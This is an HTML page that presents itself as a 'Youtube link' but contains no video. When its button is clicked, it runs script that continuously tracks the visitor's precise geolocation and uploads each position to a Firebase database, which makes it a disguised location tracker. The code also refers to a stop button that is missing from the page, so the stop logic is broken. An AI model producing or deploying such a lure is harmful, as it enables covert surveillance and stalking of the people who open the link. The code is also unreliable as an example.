<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Youtube link</title>
  <style>
    body { font-family: system-ui, sans-serif; max-width: 600px; margin: 40px auto; padding: 0 20px; line-height: 1.5; }
    button { font-size: 16px; padding: 10px 18px; cursor: pointer; margin-right: 8px; }
    #output { margin-top: 20px; padding: 16px; background: #f4f4f4; border-radius: 8px; white-space: pre-wrap; min-height: 60px; }
    .status { font-size: 14px; color: #555; margin-top: 12px; }
  </style>
</head>
<body>
  <h1>Youtube link</h1>
  <p></p>
  <button id="start">Start Youtube link</button>

  <div id="output">No data yet.</div>
  <div class="status" id="status"></div>

  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
    import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";

    // Paste your config here:
    const firebaseConfig = {
      apiKey: "...",
      authDomain: "...",
      databaseURL: "...",
      projectId: "...",
      storageBucket: "...",
      messagingSenderId: "...",
      appId: "..."
    };

    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);

    const output = document.getElementById('output');
    const status = document.getElementById('status');
    const startBtn = document.getElementById('start');
    const stopBtn = document.getElementById('stop');
    let watchId = null;
    let count = 0;

    // A simple ID so you can tell users apart in the dashboard.
    const userId = prompt("Enter your name or ID for this session:") || "anonymous";

    startBtn.addEventListener('click', () => {
      if (!navigator.geolocation) {
        output.textContent = 'Geolocation not supported.';
        return;
      }
      watchId = navigator.geolocation.watchPosition(
        (position) => {
          const { latitude, longitude, accuracy } = position.coords;
          count++;
          output.textContent =
            `Latitude:  ${latitude}\nLongitude: ${longitude}\nAccuracy:  ±${accuracy} m\n` +
            `Updated:   ${new Date(position.timestamp).toLocaleTimeString()}`;
          status.textContent = `Live — ${count} update(s) sent.`;

          // Write this update to Firebase:
          const userRef = ref(db, 'locations/' + userId);
          set(userRef, {
            latitude, longitude, accuracy,
            timestamp: position.timestamp,
            updatedAt: new Date().toISOString()
          });
        },
        (error) => {
          output.textContent = 'Error: ' + error.message;
          status.textContent = 'Stopped due to error.';
        },
        { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
      );
      startBtn.disabled = true;
      stopBtn.disabled = false;
    });

    stopBtn.addEventListener('click', () => {
      if (watchId !== null) { navigator.geolocation.clearWatch(watchId); watchId = null; }
      startBtn.disabled = false;
      stopBtn.disabled = true;
      status.textContent = `Stopped after ${count} update(s).`;
    });
  </script>
</body>
</html>
